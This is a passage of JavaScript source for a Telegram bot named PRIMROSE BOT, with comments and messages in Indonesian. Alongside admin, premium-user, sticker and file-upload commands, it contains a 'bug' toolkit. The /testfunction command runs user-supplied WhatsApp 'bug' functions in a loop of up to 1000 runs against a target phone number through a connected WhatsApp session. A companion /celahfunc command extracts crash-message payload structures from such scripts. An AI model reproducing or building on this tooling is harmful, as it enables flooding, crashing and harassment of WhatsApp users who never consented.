})

bot.onText(/\/checkupdate/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const statusMsg = await bot.sendMessage(chatId, "🔍 Mengecek update dari GitHub...")
  
  const update = await checkForUpdates()
  
  if (update.hasUpdate) {
    await bot.editMessageText(`📦 Update tersedia!\n\nVersi saat ini: v${CURRENT_VERSION}\nVersi terbaru: v${update.newVersion}\n\nGunakan /autoupdate untuk update.`, {
      chat_id: chatId,
      message_id: statusMsg.message_id
    })
  } else {
    await bot.editMessageText(`✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})\n\nAuto Update: ${autoUpdateEnabled ? "ON (otomatis)" : "OFF (manual)"}`, {
      chat_id: chatId,
      message_id: statusMsg.message_id
    })
  }
})

// ================= FITUR PREMIUM & ADMIN (XSETTINGS) ================= //

// /addprem <userId>
bot.onText(/\/addprem\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const targetUserId = parseInt(match[1])
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const existing = premiumUsers.find(u => u.id === targetUserId)
  if (existing) {
    return bot.sendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi premium user.`)
  }
  
  const options = ["💎 7 Hari", "👑 14 Hari", "🚀 30 Hari", "♾️ Permanent"]
  
  const poll = await bot.sendPoll(chatId, "💎 PILIH DURASI PREMIUM", options, { is_anonymous: false })
  
  pendingPremiumPoll[poll.poll.id] = {
    userId: targetUserId,
    adminId: userId,
    chatId: chatId
  }
})

// /delprem <userId>
bot.onText(/\/delprem\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const targetUserId = parseInt(match[1])
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const index = premiumUsers.findIndex(u => u.id === targetUserId)
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar premium.`)
  }
  
  premiumUsers.splice(index, 1)
  savePremiumUsers()
  
  bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar premium.`)
})

// /addadmin <userId>
bot.onText(/\/addadmin\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const targetUserId = parseInt(match[1])
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.")
  }
  
  if (adminUsers.includes(targetUserId)) {
    return bot.sendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi admin.`)
  }
  
  adminUsers.push(targetUserId)
  saveAdminUsers()
  
  bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil ditambahkan sebagai admin.`)
})

// /deladmin <userId>
bot.onText(/\/deladmin\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const targetUserId = parseInt(match[1])
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.")
  }
  
  const index = adminUsers.indexOf(targetUserId)
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar admin.`)
  }
  
  adminUsers.splice(index, 1)
  saveAdminUsers()
  
  bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar admin.`)
})

// /listprem
bot.onText(/\/listprem/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 Belum ada premium user.")
  }
  
  let message = `<blockquote>📋 Daftar Premium User</blockquote>\n\n`
  premiumUsers.forEach((user, index) => {
    const expires = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss')
    message += `${index + 1}. ID: <code>${user.id}</code>\n   Expires: ${expires}\n\n`
  })
  
  bot.sendMessage(chatId, message, { parse_mode: "HTML" })
})

// /listadmin
bot.onText(/\/listadmin/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  if (adminUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 Belum ada admin.")
  }
  
  let message = `<blockquote>📋 Daftar Admin</blockquote>\n\n`
  adminUsers.forEach((admin, index) => {
    message += `${index + 1}. ID: <code>${admin}</code>\n\n`
  })
  
  bot.sendMessage(chatId, message, { parse_mode: "HTML" })
})

// Handler untuk polling premium
const pendingPremiumPoll = {};

bot.on("poll_answer", async (answer) => {
  const pollData = pendingPremiumPoll[answer.poll_id]
  if (!pollData) return
  if (answer.user.id !== pollData.adminId) return
  
  const choice = answer.option_ids[0]
  let days
  if (choice === 0) days = 7
  if (choice === 1) days = 14
  if (choice === 2) days = 30
  if (choice === 3) days = "permanent"
  
  let expiresAt
  if (days === "permanent") {
    expiresAt = "permanent"
  } else {
    expiresAt = Date.now() + days * 86400000
  }
  
  const existing = premiumUsers.find(u => u.id === pollData.userId)
  if (!existing) {
    premiumUsers.push({ id: pollData.userId, expiresAt })
  } else {
    existing.expiresAt = expiresAt
  }
  
  savePremiumUsers()
  
  bot.sendMessage(pollData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${pollData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`)
  
  delete pendingPremiumPoll[answer.poll_id]
})

// ================= FITUR XTOOLSBUG ================= //

// 1. /testfunction
bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "testfunction")
  if (!hasAccess) return

  try {
    const args = msg.text.split(" ");
    if (args.length < 3) {
      return bot.sendMessage(chatId, "🪧 Example : /testfunction 62xxx 10 (reply function)");
    }

    const q = args[1];
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah) || jumlah <= 0) {
      return bot.sendMessage(chatId, "❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!msg.reply_to_message || !msg.reply_to_message.text) {
      return bot.sendMessage(chatId, "❌ Reply dengan function");
    }

    const captionProcess = `
<blockquote><pre>⬡═―—⊱ ⎧ PRIMROSE BOT ⎭ ⊰―—═⬡</pre></blockquote>
▢ Target: ${q}
▢ Type: Unknown Func
▢ Status: Process Bug
╘═——————————————═⬡
`;

    let processMsg;
    
    try {
      processMsg = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: captionProcess,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📱 CEK TARGET", url: `https://wa.me/${q}` }]
          ]
        }
      });
    } catch {
      processMsg = await bot.sendMessage(chatId, captionProcess, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📱 CEK TARGET", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }

    const processMessageId = processMsg.message_id;

    const safeSock = sessions.values().next().value;
    if (!safeSock) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    }
    
    const funcCode = msg.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return bot.sendMessage(chatId, "❌ Function tidak valid");
    }

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
    };

    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}(sock, target)`;
    
    for (let i = 0; i < jumlah; i++) {
      try {
        vm.runInContext(wrapper, context);
      } catch (err) {
        console.error("Error executing function:", err.message);
      }
      await sleep(200);
    }

    const finalText = `
<blockquote><pre>⬡═―—⊱ ⎧ PRIMROSE BOT ⎭ ⊰―—═⬡</pre></blockquote>
▢ Target: ${q}
▢ Type: Unknown Func
▢ Status: Success Bug
╘═——————————————═⬡
`;

    try {
      await bot.editMessageCaption(
        chatId,
        processMessageId,
        null,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📱 CEK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      );
    } catch {
      await bot.sendMessage(chatId, finalText, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📱 CEK TARGET", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error terjadi");
  }
});

// 2. /celahfunc
bot.onText(/\/celahfunc/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "celahfunc")
  if (!hasAccess) return

  if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
    return bot.sendMessage(chatId, "⚠️ Reply ke function atau file JavaScript yang mau diambil celahnya!");
  }

  let code = '';
  
  if (msg.reply_to_message.text) {
    code = msg.reply_to_message.text;
  } else if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const response = await axios.get(fileUrl, { responseType: 'text' });
    code = response.data;
  }

  const patterns = {
    'newsletterAdminInviteMessage': /newsletterAdminInviteMessage\s*:\s*{([^}]+)}/gs,
    'interactiveResponseMessage': /interactiveResponseMessage\s*:\s*{([^}]+)}/gs,
    'viewOnceMessage': /viewOnceMessage\s*:\s*{([^}]+)}/gs,
    'stickerMessage': /stickerMessage\s*:\s*{([^}]+)}/gs,
    'videoMessage': /videoMessage\s*:\s*{([^}]+)}/gs,
    'contactMessage': /contactMessage\s*:\s*{([^}]+)}/gs,
    'groupStatusMessageV2': /groupStatusMessageV2\s*:\s*{([^}]+)}/gs,
    'interactiveMessage': /interactiveMessage\s*:\s*{([^}]+)}/gs,
    'nativeFlowMessage': /nativeFlowMessage\s*:\s*{([^}]+)}/gs,
    'buttons': /buttons\s*:\s*\[([^\]]+)\]/gs,
    'contextInfo': /contextInfo\s*:\s*{([^}]+)}/gs
  };

  let results = [];
  
  for (const [type, pattern] of Object.entries(patterns)) {
    const matches = code.matchAll(pattern);
    for (const match of matches) {
      results.push({
        type: type,
        content: match[0].trim()
      });
    }
  }

  if (results.length === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ditemukan celah/pattern dalam code!");
  }

  let response = `<blockquote>🔍 CELAH DITEMUKAN</blockquote>\n\n`;
  response += `Total: ${results.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
  
  for (let i = 0; i < Math.min(results.length, 10); i++) {
    response += `<b>${i+1}. Type: ${results[i].type}</b>\n`;
    response += `<code>${results[i].content.substring(0, 800)}</code>\n`;
    if (results[i].content.length > 800) response += `\n... (${results[i].content.length - 800} chars terpotong)\n`;
    response += `━━━━━━━━━━━━━━━━━━\n\n`;
  }

  await bot.sendMessage(chatId, response, { parse_mode: "HTML" });
});

// 3. Fitur /brat - Membuat stiker BRAT dari teks
bot.onText(/\/brat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat.type;
  const text = match[1];
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "brat");
  if (!hasAccess) return;
  
  const loadingMsg = await bot.sendMessage(chatId, "🎨 Membuat stiker BRAT...");
  
  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;
    
    const response = await axios.get(apiURL, { responseType: "arraybuffer" });
    const stickerBuffer = Buffer.from(response.data);
    
    await bot.deleteMessage(chatId, loadingMsg.message_id);
    
    await bot.sendSticker(chatId, stickerBuffer, {
      caption: `✨ Stiker BRAT: "${text}"`
    });
    
  } catch (error) {
    console.error("Error in /brat:", error.message);
    await bot.editMessageText("❌ Gagal membuat stiker. Coba lagi nanti.", {
      chat_id: chatId,
      message_id: loadingMsg.message_id
    });
  }
});

// 4. Tourl
// ================= FITUR TOURL (CONVERT FOTO/VIDEO KE LINK) ================= //

bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat.type;
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "tourl");
  if (!hasAccess) return;

  const replyMsg = msg.reply_to_message;
  if (!replyMsg) {
    return bot.sendMessage(chatId, "❌ Format: /tourl (reply dengan foto/video)");
  }

  let fileId = null;
  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return bot.sendMessage(chatId, "❌ Hanya mendukung foto atau video");
  }

  const waitMsg = await bot.sendMessage(chatId, "⏳ Mengambil file & mengunggah ke catbox...");

  try {
    const tgLink = await bot.getFileLink(fileId);
    const tgLinkStr = String(tgLink);

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLinkStr);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await bot.deleteMessage(chatId, waitMsg.message_id);
      await bot.sendMessage(chatId, data.trim());
    } else {
      await bot.editMessageText(`❌ Gagal upload ke catbox: ${String(data).slice(0, 200)}`, {
        chat_id: chatId,
        message_id: waitMsg.message_id
      });
    }
  } catch (error) {
    const errorMsg = error?.response?.status
      ? `❌ Error ${error.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah, coba lagi.";
    await bot.editMessageText(errorMsg, {
      chat_id: chatId,
      message_id: waitMsg.message_id
    });
  }
});

// ================= FITUR CHECK & FIX ================= //

bot.onText(/^\/check$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id
    const chatType = msg.chat.type
  
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "check")
    if (!hasAccess) return
    
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, 
            "⚠️ *CARA PAKE:*\n" +
            "1. Kirim code JavaScript\n" +
            "2. Reply code tersebut\n" +
            "3. Ketik /check\n\n" +
            "Atau langsung:\n" +
            "`/check [code kamu disini]`", 
            { parse_mode: 'Markdown' }
        );
    }
    
    let code = '';
    
    if (msg.reply_to_message.text) {
        code = msg.reply_to_message.text;
    } else if (msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl, { responseType: 'text' });
        code = response.data;
    } else {
        return bot.sendMessage(chatId, "❌ Reply ke code JavaScript yang mau dicek!");
    }
    
    await checkJavaScript(chatId, code);
});

bot.onText(/\/check (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id
    const chatType = msg.chat.type
  
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "check")
    if (!hasAccess) return
    
    const code = match[1];
    await checkJavaScript(chatId, code);
});

async function checkJavaScript(chatId, code) {
    const loadingMsg = await bot.sendMessage(chatId, "🔍 *Menganalisis JavaScript...*", { parse_mode: 'Markdown' });
    
    const result = {
        hasError: false,
        errors: [],
        warnings: [],
        suggestions: [],
        syntaxHighlight: ''
    };
    
    try {
        new Function(code);
    } catch (err) {
        result.hasError = true;
        result.errors.push({
            message: err.message,
            stack: err.stack,
            line: extractLineNumber(err.stack),
            column: extractColumnNumber(err.stack)
        });
    }
    
    const undefinedVars = detectUndefinedVariables(code);
    if (undefinedVars.length > 0) {
        result.warnings.push({
            type: 'Undefined Variable',
            message: `Variable mungkin belum dideklarasi: ${undefinedVars.join(', ')}`,
            suggestion: 'Deklarasikan variable dengan let, const, atau var sebelum digunakan.'
        });
    }
    
    const missingSemi = detectMissingSemicolon(code);
    if (missingSemi.length > 0) {
        result.warnings.push({
            type: 'Missing Semicolon',
            message: `Baris ${missingSemi.join(', ')} mungkin butuh semicolon (;)`,
            suggestion: 'Tambahkan ; di akhir statement untuk menghindari ASI issues.'
        });
    }
    
    const unusedVars = detectUnusedVariables(code);
    if (unusedVars.length > 0) {
        result.warnings.push({
            type: 'Unused Variable',
            message: `Variable tidak terpakai: ${unusedVars.join(', ')}`,
            suggestion: 'Hapus variable yang tidak digunakan atau gunakan.'
        });
    }
    
    if (code.includes('console.log')) {
        result.warnings.push({
            type: 'Console Statement',
            message: 'Ditemukan console.log di code',
            suggestion: 'Hapus console.log untuk production code.'
        });
    }
    
    if (code.includes('eval(')) {
        result.warnings.push({
            type: 'Eval Usage',
            message: 'Menggunakan eval() yang berbahaya',
            suggestion: 'Hindari eval() karena security risk dan performance issue.'
        });
    }
    
    if (code.includes('debugger;')) {
        result.warnings.push({
            type: 'Debugger Statement',
            message: 'Ditemukan debugger; statement',
            suggestion: 'Hapus debugger; untuk production code.'
        });
    }
    
    const looseEquality = detectLooseEquality(code);
    if (looseEquality.length > 0) {
        result.suggestions.push({
            type: 'Loose Equality',
            message: `Gunakan === bukan == di baris ${looseEquality.join(', ')}`,
            suggestion: '=== lebih aman karena tidak melakukan type coercion.'
        });
    }
    
    if (code.match(/\bvar\s+\w+/g)) {
        result.suggestions.push({
            type: 'Var Usage',
            message: 'Menggunakan var, sebaiknya gunakan let atau const',
            suggestion: 'let dan const memiliki block scope yang lebih aman.'
        });
    }
    
    if (detectInfiniteLoop(code)) {
        result.errors.push({
            message: 'Potensi infinite loop terdeteksi!',
            suggestion: 'Pastikan loop memiliki kondisi berhenti yang valid.'
        });
        result.hasError = true;
    }
    
    if (code.includes('await') && !code.includes('try') && !code.includes('.catch')) {
        result.warnings.push({
            type: 'Missing Error Handling',
            message: 'Async/await tanpa error handling',
            suggestion: 'Gunakan try-catch atau .catch() untuk handle error.'
        });
    }
    
    if (code.includes('.then(') && !code.includes('.catch(')) {
        result.warnings.push({
            type: 'Unhandled Promise',
            message: 'Promise tanpa .catch()',
            suggestion: 'Tambahkan .catch() untuk handle rejection.'
        });
    }
    
    const lines = code.split('\n');
    let lineNumbers = '';
    
    for (let i = 0; i < Math.min(lines.length, 20); i++) {
        lineNumbers += `${i+1} | ${lines[i]}\n`;
    }
    
    let response = '';
    
    response += '╔════════════════════════════════════╗\n';
    response += '║     🔍 JAVASCRIPT ERROR CHECKER    ║\n';
    response += '╚════════════════════════════════════╝\n\n';
    
    if (!result.hasError && result.warnings.length === 0 && result.suggestions.length === 0) {
        response += '✅ *NO ERRORS DETECTED!*\nCode looks clean!\n\n';
    } else if (result.hasError) {
        response += '❌ *ERRORS FOUND!*\n\n';
    } else {
        response += '⚠️ *WARNINGS & SUGGESTIONS*\n\n';
    }
    
    if (result.errors.length > 0) {
        response += '🔴 *ERRORS:*\n';
        for (let err of result.errors) {
            response += `┌─ ❌ ${err.message}\n`;
            if (err.line) response += `│  📍 Line: ${err.line}\n`;
            if (err.column) response += `│  📍 Column: ${err.column}\n`;
            if (err.suggestion) response += `│  💡 Suggestion: ${err.suggestion}\n`;
            response += `└─────────────────────────────\n\n`;
        }
    }
    
    if (result.warnings.length > 0) {
        response += '🟡 *WARNINGS:*\n';
        for (let warn of result.warnings) {
            response += `⚠️ ${warn.type}: ${warn.message}\n`;
            response += `   💡 ${warn.suggestion}\n\n`;
        }
    }
    
    if (result.suggestions.length > 0) {
        response += '💡 *SUGGESTIONS:*\n';
        for (let sug of result.suggestions) {
            response += `• ${sug.type}: ${sug.message}\n`;
            response += `  → ${sug.suggestion}\n\n`;
        }
    }
    
    response += '\n📝 *CODE PREVIEW:*\n';
    response += '```javascript\n';
    response += lineNumbers.substring(0, 1500);
    if (lines.length > 20) response += `\n... dan ${lines.length - 20} baris lainnya\n`;
    response += '```\n';
    
    response += '\n📊 *STATISTICS:*\n';
    response += `├─ Total Lines: ${lines.length}\n`;
    response += `├─ Characters: ${code.length}\n`;
    response += `├─ Errors: ${result.errors.length}\n`;
    response += `├─ Warnings: ${result.warnings.length}\n`;
    response += `└─ Suggestions: ${result.suggestions.length}\n`;
    
    await bot.editMessageText(response, {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: 'Markdown'
    });
}

bot.onText(/^\/fix$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "fix")
  if (!hasAccess) return
  
  if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
    return bot.sendMessage(chatId, "⚠️ Reply ke code JavaScript yang mau diperbaiki!");
  }
  
  let code = '';
  
  if (msg.reply_to_message.text) {
    code = msg.reply_to_message.text;
  } else if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const response = await axios.get(fileUrl, { responseType: 'text' });
    code = response.data;
  }
  
  const loading = await bot.sendMessage(chatId, "🔧 Memperbaiki code...");
  
  let fixed = code;
  const fixes = [];
  
  if (fixed.includes('console.lg')) {
    fixed = fixed.replace(/console\.lg/g, 'console.log');
    fixes.push('Fixed console.lg → console.log');
  }
  if (fixed.includes('console.logs')) {
    fixed = fixed.replace(/console\.logs/g, 'console.log');
    fixes.push('Fixed console.logs → console.log');
  }
  
  if (fixed.includes(' == ') && !fixed.includes(' === ')) {
    fixed = fixed.replace(/==(?!=)/g, '===');
    fixes.push('Changed == to ===');
  }
  
  if (fixed.includes('var ')) {
    fixed = fixed.replace(/\bvar\s+/g, 'let ');
    fixes.push('Changed var to let');
  }
  
  const lines = fixed.split('\n');
  for (let i = 0; i < lines.length; i++) {
    let line = lines[i].trim();
    if (line && !line.endsWith(';') && !line.endsWith('{') && !line.endsWith('}') && 
        !line.endsWith('(') && !line.startsWith('//') && !line.startsWith('/*')) {
      if (!line.match(/(if|else|for|while|function|return|=>|,)$/)) {
        lines[i] += ';';
        if (fixes.length < 3) fixes.push(`Added semicolon at line ${i+1}`);
      }
    }
  }
  fixed = lines.join('\n');
  
  let open = (fixed.match(/\(/g) || []).length;
  let close = (fixed.match(/\)/g) || []).length;
  if (open > close) {
    fixed += ')'.repeat(open - close);
    fixes.push('Added missing parentheses');
  }
  
  open = (fixed.match(/\{/g) || []).length;
  close = (fixed.match(/\}/g) || []).length;
  if (open > close) {
    fixed += '}'.repeat(open - close);
    fixes.push('Added missing brackets');
  }
  
  if (fixed.includes('await') && !fixed.includes('try') && !fixed.includes('.catch')) {
    fixed = `try {\n${fixed}\n} catch (err) {\n  console.error('Error:', err);\n}`;
    fixes.push('Added try-catch for async/await');
  }
  
  let isValid = false;
  try { new Function(fixed); isValid = true; } catch(e) {}
  
  await bot.deleteMessage(chatId, loading.message_id);
  
  if (fixed !== code) {
    let msgText = `✅ *CODE DIPERBAIKI!*\n\n`;
    msgText += `📊 *${fixes.length} perbaikan:*\n`;
    fixes.slice(0, 5).forEach(f => msgText += `• ${f}\n`);
    msgText += `\n🟢 *HASIL:*\n\`\`\`javascript\n${fixed.substring(0, 1500)}\n\`\`\``;
    if (fixed.length > 1500) msgText += `\n\n📁 Code panjang, dikirim sebagai file...`;
    
    await bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
    
    if (fixed.length > 1500) {
      const filePath = `fixed_${Date.now()}.js`;
      fs.writeFileSync(filePath, fixed);
      await bot.sendDocument(chatId, filePath, { caption: `✅ Fixed code - ${fixes.length} issues fixed` });
      fs.unlinkSync(filePath);
    }
  } else {
    await bot.sendMessage(chatId, isValid ? "✅ Code sudah benar!" : "❌ Error tidak bisa diperbaiki otomatis. Cek manual.");
  }
});

// ================= HELPER FUNCTIONS UNTUK CHECK ================= //

function extractLineNumber(stack) {
    const match = stack && stack.match(/:(\d+):\d+\)/);
    return match ? parseInt(match[1]) : null;
}

function extractColumnNumber(stack) {
    const match = stack && stack.match(/:(\d+):(\d+)\)/);
    return match ? parseInt(match[2]) : null;
}

function detectUndefinedVariables(code) {
    const defined = new Set();
    const used = new Set();
    
    const declarations = code.match(/(?:let|const|var)\s+(\w+)/g);
    if (declarations) {
        declarations.forEach(decl => {
            const match = decl.match(/\b(\w+)$/);
            if (match) defined.add(match[1]);
        });
    }
    
    const words = code.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g);
    if (words) {
        words.forEach(word => {
            if (!['let', 'const', 'var', 'function', 'return', 'if', 'else', 'for', 'while', 'true', 'false', 'null', 'undefined', 'this', 'new', 'typeof', 'instanceof'].includes(word)) {
                used.add(word);
            }
        });
    }
    
    const builtins = ['console', 'document', 'window', 'Array', 'Object', 'String', 'Number', 'Boolean', 'Function', 'Promise', 'Map', 'Set', 'Date', 'Math', 'JSON', 'parseInt', 'parseFloat', 'isNaN', 'isFinite', 'encodeURI', 'decodeURI', 'setTimeout', 'setInterval', 'clearTimeout', 'clearInterval'];
    
    const undefinedVars = [...used].filter(v => !defined.has(v) && !builtins.includes(v));
    return undefinedVars.slice(0, 5);
}

function detectMissingSemicolon(code) {
    const lines = code.split('\n');
    const missing = [];
    
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim();
        if (line && !line.endsWith(';') && !line.endsWith('{') && !line.endsWith('}') && !line.endsWith('(') && !line.startsWith('//') && !line.startsWith('/*')) {
            if (!line.match(/(if|else|for|while|function|return|=>|,)$/)) {
                missing.push(i + 1);
            }
        }
    }
    
    return missing.slice(0, 10);
}

function detectUnusedVariables(code) {
    const defined = new Map();
    const used = new Set();
    
    const varPattern = /(?:let|const|var)\s+(\w+)(?:\s*=\s*[^;]+)?/g;
    let match;
    while ((match = varPattern.exec(code)) !== null) {
        defined.set(match[1], { line: getLineNumber(code, match.index) });
    }
    
    const funcPattern = /function\s+\w+\s*\(([^)]*)\)/g;
    while ((match = funcPattern.exec(code)) !== null) {
        const params = match[1].split(',').map(p => p.trim());
        params.forEach(p => {
            if (p) defined.set(p, { line: getLineNumber(code, match.index) });
        });
    }
    
    const usagePattern = /\b([a-zA-Z_$][a-zA-Z0-9_$]*)\b/g;
    while ((match = usagePattern.exec(code)) !== null) {
        const word = match[1];
        if (!['let', 'const', 'var', 'function', 'return', 'if', 'else', 'for', 'while', 'true', 'false', 'null', 'undefined', 'this', 'new', 'typeof', 'instanceof'].includes(word)) {
            used.add(word);
        }
    }
    
    const builtins = ['console', 'document', 'window', 'Array', 'Object', 'String', 'Number', 'Boolean', 'Function', 'Promise', 'Map', 'Set', 'Date', 'Math', 'JSON', 'parseInt', 'parseFloat', 'isNaN', 'isFinite', 'encodeURI', 'decodeURI', 'setTimeout', 'setInterval', 'clearTimeout', 'clearInterval'];
    
    const unused = [];
    for (let [varName, info] of defined) {
        if (!used.has(varName) && !builtins.includes(varName)) {
            unused.push(varName);
        }
    }
    
    return unused.slice(0, 5);
}

function detectLooseEquality(code) {
    const lines = code.split('\n');
    const looseLines = [];
    
    for (let i = 0; i < lines.length; i++) {
        if (lines[i].includes(' == ') && !lines[i].includes(' === ')) {
            looseLines.push(i + 1);
        }
    }
    
    return looseLines;
}

function detectInfiniteLoop(code) {
    if (code.includes('while (true)') && !code.includes('break')) {
        return true;
    }
    
    if (code.includes('for (') && code.includes(';;')) {
        return true;
    }
    
    return false;
}

function getLineNumber(code, index) {
    const lines = code.substring(0, index).split('\n');
    return lines.length;
}

// ================= FITUR GROUP SECURITY ================= //

bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const commandName = match[1].toLowerCase().replace("/", "")
  
  if (isCommandBlocked(commandName)) {
    return bot.sendMessage(chatId, `⚠️ Command /${commandName} sudah dalam keadaan diblokir.`)
  }
  
  blockedCommands.push(commandName)
  saveBlockedCommands(blockedCommands)
  
  bot.sendMessage(chatId, `✅ Command /${commandName} berhasil diblokir. User tidak akan bisa menggunakan command ini.`)
})

bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const commandName = match[1].toLowerCase().replace("/", "")
  
  if (!isCommandBlocked(commandName)) {
    return bot.sendMessage(chatId, `⚠️ Command /${commandName} tidak dalam keadaan diblokir.`)
  }
  
  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName)
  saveBlockedCommands(blockedCommands)
  
  bot.sendMessage(chatId, `✅ Command /${commandName} berhasil dibuka. User bisa menggunakan command ini kembali.`)
})

bot.onText(/\/addpremgrup\s+(\d+)([dhm])?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
